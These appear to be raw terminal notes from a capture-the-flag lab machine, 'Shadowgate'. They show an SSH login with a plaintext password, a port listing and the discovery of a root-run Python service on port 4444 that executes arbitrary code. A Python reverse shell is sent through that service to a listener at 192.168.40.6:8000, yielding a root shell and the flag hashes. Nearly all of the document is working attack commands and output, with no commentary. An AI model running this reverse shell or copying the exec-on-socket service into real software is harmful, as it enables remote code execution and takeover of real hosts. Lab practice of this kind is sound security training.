





mars:sshpassword123
ssh mars@192.168.40.15                  
The authenticity of host '192.168.40.15 (192.168.40.15)' can't be established.
ED25519 key fingerprint is: SHA256:/pWWlb/RzrJquNDUW93sWc9GTvJj3Uq8OGAR6Rpxzvg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.40.15' (ED25519) to the list of known hosts.
mars@192.168.40.15's password: 
Last login: Sat May  3 18:29:16 2025 from 192.168.1.38
mars@TheHackersLabs-Shadowgate:~$ ls
user.txt
mars@TheHackersLabs-Shadowgate:~$ sudo -l
[sudo] password for mars: 
Sorry, user mars may not run sudo on TheHackersLabs-Shadowgate.
mars@TheHackersLabs-Shadowgate:~$ cat *
acf98ae58aaaf2378f9ba30975c2ad40

ss -tulnp
Netid                 State                  Recv-Q                 Send-Q                                                     Local Address:Port                                  Peer Address:Port                Process                 
udp                   UNCONN                 0                      0                                                             127.0.0.54:53                                         0.0.0.0:*                                           
udp                   UNCONN                 0                      0                                                          127.0.0.53%lo:53                                         0.0.0.0:*                                           
udp                   UNCONN                 0                      0                                                   192.168.40.15%enp0s3:68                                         0.0.0.0:*                                           
udp                   UNCONN                 0                      0                                      [fe80::a00:27ff:fea3:92dc]%enp0s3:546                                           [::]:*                                           
tcp                   LISTEN                 0                      4096                                                          127.0.0.54:53                                         0.0.0.0:*                                           
tcp                   LISTEN                 0                      4096                                                       127.0.0.53%lo:53                                         0.0.0.0:*                                           
tcp                   LISTEN                 0                      5                                                              127.0.0.1:4444                                       0.0.0.0:*                                           
tcp                   LISTEN                 0                      128                                                              0.0.0.0:8080                                       0.0.0.0:*                                           
tcp                   LISTEN                 0                      5                                                                0.0.0.0:56789                                      0.0.0.0:*                                           
tcp                   LISTEN                 0                      4096                                                                   *:22                                               *:*                                           
mars@TheHackersLabs-Shadowgate:~$ cd /
mars@TheHackersLabs-Shadowgate:/$ ls
bin  bin.usr-is-merged  boot  cdrom  dev  etc  home  lib  lib64  lib.usr-is-merged  lost+found  media  mnt  opt  proc  root  run  sbin  sbin.usr-is-merged  snap  srv  swap.img  sys  tmp  usr  var
mars@TheHackersLabs-Shadowgate:/$ ls /opt/shadow-tools
bin  venv
mars@TheHackersLabs-Shadowgate:/$ cd /opt/shadow-tools
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools$ ls
bin  venv
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools$ cdbin
cdbin: command not found
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools$ cd bin
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls
gate.py  shadow-client.py  web-login.py
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ cat shadow-client.py
#!/usr/bin/env python3
import socket
import threading
import io
import contextlib

def handle_client(client_socket):
    client_socket.send(b"Welcome to Shadow Client Helper\n")
    client_socket.send(b"This is an unrestricted environment. Good luck, hacker.\n")
    while True:
        client_socket.send(b">>> ")
        code = client_socket.recv(1024).decode().strip()
        try:
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                exec(code, globals())
            result = output.getvalue()
            if result.strip():
                client_socket.send(result.encode())
        except Exception as e:
            client_socket.send(f"Error: {e}\n".encode())

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 4444))
    server.listen(5)
    while True:
        client, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    main()
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ nc 127.0.0.1 4444
Welcome to Shadow Client Helper
This is an unrestricted environment. Good luck, hacker.
>>> ls
Error: name 'ls' is not defined
>>> import socket,subprocess,os
>>> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
>>> s.connect(("192.168.40.6",8000))
>>> os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
>>> subprocess.call(["/bin/bash","-i"])

nc -lvnp 8000
listening on [any] 8000 ...
connect to [192.168.40.6] from (UNKNOWN) [192.168.40.15] 37590
bash: cannot set terminal process group (730): Inappropriate ioctl for device
bash: no job control in this shell
root@TheHackersLabs-Shadowgate:/# whoami
root

437a1660c02e61f6e2f59f15f90f52ae
